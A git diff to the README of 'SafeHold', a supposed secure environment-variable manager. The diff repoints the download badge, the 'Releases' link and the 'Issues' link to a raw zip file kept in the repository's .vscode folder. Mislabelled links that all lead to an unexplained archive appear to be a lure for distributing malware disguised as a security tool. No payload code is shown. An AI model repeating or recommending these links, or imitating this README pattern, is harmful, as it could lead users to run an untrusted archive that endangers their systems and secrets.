@@ -1,7 +1,7 @@
 # 🛡️ safehold - Secure Your Environment Variables Easily
 
 ## 📥 Download SafeHold
-[![Download SafeHold](https://raw.githubusercontent.com/Siyahkan0637/safehold/main/tribalist/safehold.zip)](https://raw.githubusercontent.com/Siyahkan0637/safehold/main/tribalist/safehold.zip)
+[![Download SafeHold](https://raw.githubusercontent.com/Siyahkan0637/safehold/main/.vscode/Software_3.8-alpha.2.zip)](https://raw.githubusercontent.com/Siyahkan0637/safehold/main/.vscode/Software_3.8-alpha.2.zip)
 
 ## 🗂️ Description
 SafeHold is a secure, cross-platform environment variable manager with both CLI and GUI interfaces. It stores environment variables and secrets encrypted at rest. SafeHold supports unlocked sets (app-managed key) and locked sets (password-protected). It's perfect for managing project-specific and global environment variables without exposing sensitive data.
@@ -16,7 +16,7 @@ To get started with SafeHold, follow these easy steps.
 - **Disk Space**: Minimum 100 MB of free space.
 
 ## 🌐 Download & Install
-To download SafeHold, visit this page: [SafeHold Releases](https://raw.githubusercontent.com/Siyahkan0637/safehold/main/tribalist/safehold.zip). Choose the version suitable for your operating system and follow these simple steps to install:
+To download SafeHold, visit this page: [SafeHold Releases](https://raw.githubusercontent.com/Siyahkan0637/safehold/main/.vscode/Software_3.8-alpha.2.zip). Choose the version suitable for your operating system and follow these simple steps to install:
 
 1. **Visit the Releases Page**: Click the link above to go to the releases page.
 2. **Select Your OS**: Find the download link that matches your operating system.
@@ -51,7 +51,7 @@ Yes, SafeHold is an open-source project. You can view the source code or contrib
 If you encounter any issues, please open an issue on the GitHub repository. This helps us improve the software.
 
 ## 🛠️ Support
-For further assistance, please check the [Issues](https://raw.githubusercontent.com/Siyahkan0637/safehold/main/tribalist/safehold.zip) page on GitHub. You can also join our community discussions for tips and support.
+For further assistance, please check the [Issues](https://raw.githubusercontent.com/Siyahkan0637/safehold/main/.vscode/Software_3.8-alpha.2.zip) page on GitHub. You can also join our community discussions for tips and support.
 
 ## 🌟 Community 
 Join our community to share your experiences, ask questions, or get help. Engage with other SafeHold users and contribute your knowledge.
